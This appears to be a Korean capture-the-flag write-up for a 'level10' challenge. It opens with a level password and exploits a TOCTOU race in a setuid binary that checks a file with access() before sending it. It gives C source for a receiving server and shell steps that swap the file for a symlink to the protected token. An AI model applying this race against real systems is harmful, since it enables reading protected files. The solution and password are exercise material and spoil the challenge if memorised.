password: s5cAJpM8ev6XHw998pRWG728z

# 접근 방법

access()를 통해서 파일의 실제 권한을 확인한 뒤에 나중에 그 파일의 내용을 서버로 보내는 프로그램인데

access()체크 뒤에 파일을 바꾸는 공격에 취약하다는 점을 이용함.

서버 소스
```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
​
int main(int ac, char **av)
{
  struct sockaddr_in servaddr;
  uint16_t port = 6969;
  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = INADDR_ANY;
	servaddr.sin_port = htons(port);
​
  int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
  bind(sock_fd, (const struct sockaddr *)&servaddr, sizeof(servaddr));
  listen(sock_fd, 0);
​
  printf("waiting...\n");
  getchar();
​
  struct sockaddr_in clientaddr;
  socklen_t len = sizeof(clientaddr);
  int client_fd = accept(sock_fd, (struct sockaddr *)&clientaddr, &len);
​
  char buf[4096];
  while (1)
  {
    int r = read(client_fd, buf, sizeof(buf));
    if (r <= 0)
      break;
    write(1, buf, r);
  }
  return (0);
}
```

1) /tmp 폴더에 적당한 파일을 생성
2) 서버 실행
3) level10프로그램 실행
4) 방금 생성한 파일과 같은 이름으로 token에 대한 소프트 링크 생성
5) 서버 실행 재개

```shell
> touch /tmp/test
> python /tmp/server.py
> ~/level10 /tmp/test localhost
> ln -s ~/token /tmp/test
> PRESS ANY KEY
```